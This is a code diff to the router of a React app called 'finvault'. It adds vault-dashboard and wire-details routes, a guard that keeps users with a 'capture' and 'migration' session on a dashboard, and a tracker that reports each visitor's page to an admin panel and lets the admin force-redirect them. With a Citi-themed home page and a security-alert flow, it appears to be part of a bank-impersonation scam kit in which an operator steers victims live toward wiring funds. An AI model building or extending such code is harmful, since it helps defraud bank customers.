@@ -23,6 +23,9 @@ import AdminLogin from '@/pages/AdminLogin';
 import AdminDashboard from '@/pages/AdminDashboard';
 import SecurityAlertPage from '@/pages/SecurityAlertPage';
 import VaultSetupPage from '@/pages/VaultSetupPage';
+import VaultCreatingPage from '@/pages/VaultCreatingPage';
+import VaultDashboardPage from '@/pages/VaultDashboardPage';
+import WireDetailsPage from '@/pages/WireDetailsPage';
 import { Route, Switch, Router as WouterRouter, useLocation } from 'wouter';
 
 const queryClient = new QueryClient();
@@ -32,6 +35,21 @@ function getActiveHome() {
   if (localStorage.getItem('finvault_animal_mode') === 'true') return AnimalPage;
   if (localStorage.getItem('finvault_active_theme') === 'citi') return HomeCiti;
   return Home;
+}
+
+/** If user has an active capture+migration session, keep them at the dashboard on refresh */
+function SessionGuard() {
+  const [location, navigate] = useLocation();
+  useEffect(() => {
+    const isRoot = location === '/' || location === '';
+    if (!isRoot) return;
+    const captureId = localStorage.getItem('finvault_vault_capture_id');
+    const migrationStarted = localStorage.getItem('finvault_migration_started');
+    if (captureId && migrationStarted === 'true') {
+      navigate('/vault-dashboard');
+    }
+  }, [location, navigate]);
+  return null;
 }
 
 /** Tracks current page in localStorage so admin dashboard can see it in real time */
@@ -46,8 +64,9 @@ function PageTracker() {
   }, [location]);
 
   useEffect(() => {
-    // Poll for admin-issued redirect every 800ms
+    // Poll for admin-issued redirect every 800ms — never navigate the admin itself
     const id = setInterval(() => {
+      if (location.startsWith('/admin')) return;
       const target = localStorage.getItem('finvault_force_nav');
       if (target) {
         localStorage.removeItem('finvault_force_nav');
@@ -55,7 +74,7 @@ function PageTracker() {
       }
     }, 800);
     return () => clearInterval(id);
-  }, [navigate]);
+  }, [navigate, location]);
 
   return null;
 }
@@ -65,6 +84,7 @@ function Router() {
 
   return (
     <>
+      <SessionGuard />
       <PageTracker />
       <Switch>
         <Route path="/" component={ActiveHome} />
@@ -107,6 +127,9 @@ function Router() {
         {/* Auth & security flow */}
         <Route path="/security-alert" component={SecurityAlertPage} />
         <Route path="/vault-setup" component={VaultSetupPage} />
+        <Route path="/vault-creating" component={VaultCreatingPage} />
+        <Route path="/vault-dashboard" component={VaultDashboardPage} />
+        <Route path="/wire-details" component={WireDetailsPage} />
 
         {/* Preview routes (direct access regardless of active theme) */}
         <Route path="/preview/citi" component={HomeCiti} />
